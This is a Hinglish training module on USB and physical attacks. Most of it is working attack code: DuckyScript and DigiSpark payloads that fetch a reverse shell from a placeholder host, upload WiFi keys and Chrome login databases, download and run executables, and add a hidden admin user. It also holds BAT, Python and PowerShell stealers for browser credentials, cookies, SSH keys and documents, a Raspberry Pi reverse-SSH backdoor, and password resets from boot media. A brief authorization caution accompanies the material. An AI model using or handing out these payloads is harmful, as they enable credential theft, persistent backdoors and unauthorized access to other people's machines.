# 🔌 Phase 6 — USB & Physical Attacks

> Physical access = Game over. Pendrive lagao, data lo, backdoor chhodo.
> Yeh techniques red teaming aur physical pentesting mein use hoti hain.

> [!CAUTION]
> In techniques ko sirf **authorized red team engagements** mein use karo.
> Kisi ka pendrive bina permission lagana = theft + unauthorized access = **JAIL**

---

## 🦆 USB Rubber Ducky & BadUSB

### What is Rubber Ducky?

```
USB Rubber Ducky = Ek USB device jo keyboard ki tarah kaam karta hai
Jab plug karo → Computer sochta hai keyboard lagaya hai
→ Automated keystrokes bhejta hai at superhuman speed
→ Seconds mein commands execute ho jaate hain!

Price: ~$80 (Hak5 shop)
DIY Alternative: Arduino + DigiSpark ($3-5!)
```

### Rubber Ducky Payloads (DuckyScript)

```
REM ═══════════════════════════════════════════════
REM PAYLOAD 1: Open reverse shell in 3 seconds!
REM ═══════════════════════════════════════════════
DELAY 1000
GUI r
DELAY 500
STRING powershell -ep bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"
ENTER

REM ═══════════════════════════════════════════════
REM PAYLOAD 2: Dump WiFi passwords
REM ═══════════════════════════════════════════════
DELAY 1000
GUI r
DELAY 500
STRING cmd /c "netsh wlan show profiles" > %TEMP%\wifi.txt & for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| findstr "Profile"') do netsh wlan show profile name=%a key=clear >> %TEMP%\wifi.txt & powershell -c "(New-Object Net.WebClient).UploadFile('http://YOUR_IP/upload', '%TEMP%\wifi.txt')"
ENTER

REM ═══════════════════════════════════════════════
REM PAYLOAD 3: Grab saved Chrome passwords (Windows)
REM ═══════════════════════════════════════════════
DELAY 1000
GUI r  
DELAY 500
STRING powershell -ep bypass -w hidden -c "copy '%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data' '%TEMP%\chrome_pass.db'; (New-Object Net.WebClient).UploadFile('http://YOUR_IP/upload','%TEMP%\chrome_pass.db')"
ENTER

REM ═══════════════════════════════════════════════
REM PAYLOAD 4: Download & Execute payload
REM ═══════════════════════════════════════════════
DELAY 1000
GUI r
DELAY 500
STRING powershell -ep bypass -w hidden -c "Invoke-WebRequest 'http://YOUR_IP/payload.exe' -OutFile '%TEMP%\update.exe'; Start-Process '%TEMP%\update.exe'"
ENTER

REM ═══════════════════════════════════════════════
REM PAYLOAD 5: Create admin user (Windows)
REM ═══════════════════════════════════════════════
DELAY 1000
GUI r
DELAY 500
STRING cmd /c net user hacker Pass123! /add && net localgroup administrators hacker /add
ENTER

REM ═══════════════════════════════════════════════
REM PAYLOAD 6: Exfiltrate files to USB (data theft)
REM ═══════════════════════════════════════════════
DELAY 1000
GUI r
DELAY 500  
STRING powershell -ep bypass -w hidden -c "$usb = (Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2}).DeviceID; Copy-Item $env:USERPROFILE\Desktop\*.* $usb\loot\ -Recurse -Force; Copy-Item $env:USERPROFILE\Documents\*.* $usb\loot\ -Recurse -Force"
ENTER
```

### DIY BadUSB with Arduino/DigiSpark ($3!)

```
Hardware needed:
- Digispark ATtiny85 USB (~₹250 on Amazon India)
- Arduino IDE (free software)

Setup:
1. Install Arduino IDE: https://www.arduino.cc/en/software
2. Add Digispark board: 
   File → Preferences → Additional Board URLs →
   http://digistump.com/package_digistump_index.json
3. Tools → Board → Digispark (Default - 16.5mhz)
4. Upload payload!
```

```cpp
// DigiSpark BadUSB Payload — Reverse Shell
#include "DigiKeyboard.h"

void setup() {
    DigiKeyboard.sendKeyStroke(0);  // wake up
    DigiKeyboard.delay(1000);
    
    // Open Run dialog (Windows+R)
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    
    // Type PowerShell command
    DigiKeyboard.print("powershell -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')\"");
    DigiKeyboard.delay(200);
    
    // Press Enter
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {} // nothing
```

---

## 💾 Pendrive Data Extraction

### Auto-Copy Files When USB Plugged In

```bash
# ═══════════════════════════════════════════════
# METHOD 1: Linux USB Auto-Copy Script
# ═══════════════════════════════════════════════
```

```python
#!/usr/bin/env python3
"""
USB Data Extractor — Copies target files when USB is inserted
FOR AUTHORIZED TESTING ONLY!
"""
import os
import shutil
import time
from pathlib import Path

# Config
USB_MOUNT = "/media/usb"           # USB mount point
LOOT_DIR = "/tmp/.loot"            # Where to save stolen data
EXTENSIONS = ['.pdf', '.docx', '.xlsx', '.txt', '.pptx', 
              '.jpg', '.png', '.csv', '.db', '.sql',
              '.key', '.pem', '.kdbx']  # Password manager DBs

def grab_files(source_dirs):
    """Copy interesting files"""
    os.makedirs(LOOT_DIR, exist_ok=True)
    
    for src_dir in source_dirs:
        if os.path.exists(src_dir):
            for root, dirs, files in os.walk(src_dir):
                for f in files:
                    if any(f.lower().endswith(ext) for ext in EXTENSIONS):
                        src = os.path.join(root, f)
                        dst = os.path.join(LOOT_DIR, f)
                        try:
                            shutil.copy2(src, dst)
                            print(f"[+] Copied: {src}")
                        except:
                            pass

# Target directories
targets = [
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Documents"),
    os.path.expanduser("~/Downloads"),
    os.path.expanduser("~/Pictures"),
]

grab_files(targets)
print(f"[*] Files saved to {LOOT_DIR}")
```

```batch
REM ═══════════════════════════════════════════════
REM METHOD 2: Windows BAT file (autorun on USB)
REM Save as: autorun.bat on USB drive
REM ═══════════════════════════════════════════════

@echo off
set dest=%~d0\loot
mkdir %dest% 2>nul

REM Copy Desktop files
xcopy "%USERPROFILE%\Desktop\*.*" "%dest%\Desktop\" /s /e /y /q 2>nul

REM Copy Documents
xcopy "%USERPROFILE%\Documents\*.*" "%dest%\Documents\" /s /e /y /q 2>nul

REM Copy Downloads  
xcopy "%USERPROFILE%\Downloads\*.*" "%dest%\Downloads\" /s /e /y /q 2>nul

REM Copy Chrome saved passwords database
copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" "%dest%\chrome_passwords.db" 2>nul

REM Copy Firefox profiles
xcopy "%APPDATA%\Mozilla\Firefox\Profiles\*.*" "%dest%\Firefox\" /s /e /y /q 2>nul

REM Copy WiFi passwords
netsh wlan show profiles > "%dest%\wifi_profiles.txt"
for /f "tokens=2 delims=:" %%a in ('netsh wlan show profiles ^| findstr "Profile"') do (
    netsh wlan show profile name=%%a key=clear >> "%dest%\wifi_passwords.txt"
)

REM Copy SSH keys
xcopy "%USERPROFILE%\.ssh\*.*" "%dest%\ssh_keys\" /s /e /y /q 2>nul

REM Copy browser bookmarks
copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Bookmarks" "%dest%\bookmarks.json" 2>nul

attrib +h +s "%dest%"
exit
```

### PowerShell Data Exfiltration

```powershell
# ═══════════════════════════════════════════════
# PowerShell USB Exfiltrator
# Runs from Rubber Ducky or BadUSB
# ═══════════════════════════════════════════════

# Find USB drive letter
$usb = (Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2}).DeviceID
$loot = "$usb\loot_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -ItemType Directory -Path $loot -Force

# System info
systeminfo | Out-File "$loot\sysinfo.txt"
Get-Process | Out-File "$loot\processes.txt"
ipconfig /all | Out-File "$loot\network.txt"

# WiFi passwords
$profiles = netsh wlan show profiles | Select-String "Profile" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}
foreach ($p in $profiles) {
    netsh wlan show profile name="$p" key=clear | Out-File "$loot\wifi_$p.txt"
}

# Browser data
$chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
Copy-Item "$chrome\Login Data" "$loot\chrome_logins.db" -Force 2>$null
Copy-Item "$chrome\Cookies" "$loot\chrome_cookies.db" -Force 2>$null
Copy-Item "$chrome\History" "$loot\chrome_history.db" -Force 2>$null
Copy-Item "$chrome\Bookmarks" "$loot\chrome_bookmarks.json" -Force 2>$null

# Documents (specific extensions)
$extensions = @("*.pdf","*.docx","*.xlsx","*.txt","*.csv","*.pptx","*.key","*.pem")
foreach ($ext in $extensions) {
    Get-ChildItem "$env:USERPROFILE" -Recurse -Filter $ext -ErrorAction SilentlyContinue |
    Copy-Item -Destination "$loot" -Force 2>$null
}

# SSH keys
Copy-Item "$env:USERPROFILE\.ssh\*" "$loot\ssh_keys\" -Recurse -Force 2>$null

# Clipboard content
Get-Clipboard | Out-File "$loot\clipboard.txt"

# Recent files
Copy-Item "$env:APPDATA\Microsoft\Windows\Recent\*" "$loot\recent\" -Recurse -Force 2>$null
```

---

## 🔧 Physical Attack Hardware

### Hacker Hardware Shopping List

```
┌────────────────────────────────────────────────────────────┐
│ DEVICE              │ PRICE    │ WHAT IT DOES              │
├────────────────────────────────────────────────────────────┤
│ USB Rubber Ducky    │ $80      │ Keystroke injection        │
│ Digispark ATtiny85  │ ₹250     │ DIY BadUSB (cheap!)       │
│ Bash Bunny          │ $120     │ Advanced USB attacks      │
│ WiFi Pineapple      │ $100-300 │ WiFi MITM & evil twin    │
│ Alfa WiFi Adapter   │ $30-70   │ Monitor mode WiFi card   │
│ LAN Turtle          │ $60      │ Network implant           │
│ Flipper Zero        │ $170     │ Multi-tool (RFID, IR, RF)│
│ HackRF One          │ $300     │ Software Defined Radio   │
│ Proxmark3           │ $200     │ RFID/NFC cloning         │
│ O.MG Cable          │ $120     │ Malicious USB cable!     │
│ Raspberry Pi        │ $35-80   │ Drop box, rogue AP       │
│ USB Armory          │ $150     │ Tiny computer in USB     │
└────────────────────────────────────────────────────────────┘
```

### Flipper Zero — Modern Hacker's Tool

```
Flipper Zero can:
├── Read/Write/Emulate RFID cards (door badges!)
├── Read/Clone NFC tags
├── Capture & Replay IR signals (TVs, ACs)
├── Sub-GHz radio (car fobs, garage doors — for analysis)  
├── GPIO pins for hardware hacking
├── BadUSB mode (works like Rubber Ducky!)
├── iButton (legacy access systems)
└── Bluetooth tools

Where to learn:
- Official docs: https://docs.flipper.net/
- YouTube: "Flipper Zero Hacking" — search this
- Reddit: r/flipperzero

Note: Flipper Zero is LEGAL to own.
Using it to access unauthorized systems is NOT legal.
```

### Raspberry Pi Drop Box

```bash
# ═══════════════════════════════════════════════
# Turn a Raspberry Pi into a hidden network backdoor
# Plug it into target's network → remote access forever!
# ═══════════════════════════════════════════════

# Setup on Raspberry Pi:
# 1. Install Kali Linux ARM
# 2. Configure auto-connect to your VPN
# 3. Set up reverse SSH tunnel

# Auto reverse SSH tunnel (runs on boot)
# Add to /etc/rc.local:
ssh -fN -R 2222:localhost:22 your_user@YOUR_VPS -o StrictHostKeyChecking=no

# From your machine, connect to Pi through VPS:
ssh -p 2222 pi@YOUR_VPS

# Now you have remote access to target's internal network!

# Or use a C2 framework like:
# - Mythic
# - Sliver
# - Cobalt Strike (commercial)
```

---

## 🔐 Physical Security Bypasses

### Lock Picking (Red Team)

```
Lock picking is a legitimate skill for:
- Physical penetration testing
- Red team engagements
- Security assessments

Learn:
- YouTube: "LockPickingLawyer" channel (educational)
- Practice lock sets available on Amazon
- Lockpick sets: ~₹500-2000 on Amazon India

Types of locks to learn:
1. Pin tumbler locks (most common)
2. Wafer locks
3. Disc detainer locks
4. Padlocks
```

### Bypassing Login Screens

```bash
# ═══════════════════════════════════════════════
# WINDOWS — Boot from USB, reset password
# ═══════════════════════════════════════════════
# 1. Boot from Kali Linux USB
# 2. Mount Windows partition:
sudo mount /dev/sda2 /mnt
# 3. Use chntpw to reset admin password:
sudo apt install -y chntpw
cd /mnt/Windows/System32/config/
sudo chntpw SAM
# Select user → Clear password → Save

# ═══════════════════════════════════════════════
# LINUX — Boot from USB, change password
# ═══════════════════════════════════════════════
# 1. Boot from Live USB
# 2. Mount target partition:
sudo mount /dev/sda1 /mnt
# 3. Chroot into it:
sudo chroot /mnt
# 4. Change root password:
passwd root

# ═══════════════════════════════════════════════
# MAC — Single User Mode
# ═══════════════════════════════════════════════
# Intel Mac: Cmd+S at boot → single user mode
# mount -uw /
# launchctl load /System/Library/LaunchDaemons/com.apple.opendirectoryd.plist  
# dscl . -passwd /Users/admin newpassword
```

---

## 🎥 Phase 6 Videos

```
1. "USB Rubber Ducky Payloads" — NetworkChuck
   https://www.youtube.com/watch?v=uH-4btjE56E

2. "BadUSB Attack with $3 Arduino" — Null Byte
   https://www.youtube.com/watch?v=ULbpbRXhOnk

3. "Flipper Zero — Everything You Need to Know" — NetworkChuck
   https://www.youtube.com/watch?v=6rMFfg8nqKU

4. "Physical Penetration Testing" — DEFCON Talk
   https://www.youtube.com/watch?v=rnmcRTnTNC8

5. "WiFi Pineapple Tutorial" — Hak5
   https://www.youtube.com/watch?v=7v3JR4Wlw4Q

6. "Raspberry Pi Hacking" — David Bombal  
   https://www.youtube.com/watch?v=za4VJvhmYwA

7. Hak5 Channel (makers of Rubber Ducky, Pineapple):
   https://www.youtube.com/@haborreccieh5
```

---

## ✅ Phase 6 Checklist

```
USB ATTACKS
[ ] Understand how HID attacks work
[ ] Can write DuckyScript payloads
[ ] Know about DigiSpark BadUSB ($3 alternative)
[ ] Can create USB data extraction scripts
[ ] Understand autorun concepts

PHYSICAL ATTACKS
[ ] Know about Flipper Zero capabilities
[ ] Understand RFID/NFC cloning concepts
[ ] Know about Raspberry Pi drop boxes
[ ] Can reset Windows/Linux passwords with physical access

HARDWARE
[ ] Know the hacker hardware ecosystem
[ ] Understand which tools to buy first
[ ] Can build DIY hacking tools
```

---

> **Phase 6 done? → [Phase 7 — Mobile Hacking](./Phase7_Mobile_Hacking.md)** 📱
